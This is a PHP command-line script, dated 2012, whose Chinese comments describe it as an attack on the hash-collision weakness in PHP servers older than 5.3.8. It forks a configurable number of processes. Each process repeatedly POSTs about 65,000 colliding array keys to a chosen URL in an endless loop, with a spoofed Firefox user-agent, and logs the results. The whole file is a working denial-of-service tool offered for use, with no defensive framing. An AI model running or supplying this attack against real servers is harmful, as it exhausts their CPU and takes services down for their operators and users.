<?php
//author:Willlee 2012-4-11
//用于攻击php 5.3.8 以前版本的服务器hash漏洞
//not time out
//set_time_limit(0);
//命令行运行需要参数 
error_reporting(0);

$params = getArgv();
$forknum = $params['forknum'];
$logfile = $params['logfile'] ? $params['logfile'] : '0';
$url = $params['url'];
$acttacktime = 1;

if(empty($url)){
     echo "php hackhash.php -n -w file -u [url]\n";
     exit;
}
while(1){
     $log =  "hashActtack start url($url):\r\n";
     $log .=  "start fork: ($forknum)\r\n";
        writelog($logfile, $log);
     $pids = array();
     for($i = 1; $i<=$forknum;$i++){
          $pid = pcntl_fork();    
          if($pid == -1){
               echo "fail\r\n";
          }elseif($pid){
               $pids[$i] = $pid;
               $log = "fork [".$pids[$i]."] in parent!\r\n";    
                        writelog($logfile, $log);
          }else{
//                     $myId = pcntl_waitpid(-1, $status, WNOHANG);
               $log =  "fork [".posix_getpid()."] hashActtack start!\r\n";
                        writelog($logfile, $log);
               $res = hashActtack($url);
               $log = "fork [".posix_getpid()."] hashActtack end! status:$res\r\n";
               writelog($logfile, $log);
               //自杀退出子进程
               posix_kill(getmypid(),9);
               exit(0);
               /*
               fclose(SIDIN);
               fclose(SIDOUT);
               fclose(SIDERR);
               register_shutdown_function('shutdown');
               */
          }
     }
    
       while(count($pids) > 0)
        {
                $myId = pcntl_waitpid(-1, $status, WNOHANG);
                foreach($pids as $key => $pid)
                {
                        if($myId == $pid){
                    $log = "($key)fork [".$pid."]  die...:\r\n";
                    $log .="totoal acttack time:$acttacktime\r\n";
                    writelog($logfile, $log);
                    $acttacktime ++;
                    unset($pids[$key]);
               }
                }
                //usleep(1000);
        }

}
function getArgv(){
     global $argv, $argc;
     if($argc < 4 || $argc > 7){
          echo "error:wrong params\nphp hackhash.php -n -w [file] -u url\n";
          exit();
     }
     foreach($argv as $k => $v){
          switch($v){
               case '-n':
                    $params['forknum'] = $argv[$k+1] ? $argv[$k+1] : '3';    
                    break;    
               case '-w':
                    $params['logfile'] = $argv[$k+1] ? $argv[$k+1] : '0';    
                    break;    
               case '-u':
                    $params['url'] = $argv[$k+1] ? $argv[$k+1] : '';    
                    break;    
          }
     }
     return $params;

}

//post hash
function hashActtack($url){
     $size = pow(2, 16);
     $array = array();
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     for ($key = 0, $maxKey = ($size - 1) * $size; $key <= $maxKey; $key += $size) {
          #$array[$key] = 0;
          $argument.="a[".$key."]=0&";
     }
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $argument."1=1");
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_TIMEOUT, '1');
     curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 (.NET CLR 3.5.30729)');
     //curl_setopt($ch, CURLOPT_NOBODY, 1);
     curl_setopt($ch, CURLOPT_HEADER, 1);
     
     $return['result'] = curl_exec($ch);
     $return['code'] = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
     if($return['code'] == '200'){
          return "Hit 200";
     }else{
          return  "Hit";
     }
}
//kill the fork
function shutdown(){
     posix_kill(posix_getpid(), SIGHUP);
}
function writelog($file,$log){
     if(empty($file)){
          echo $log;
          return;
     }


     if($file && $log){
           file_put_contents($file,$log,FILE_APPEND);         
     }
     return;    
}
?>

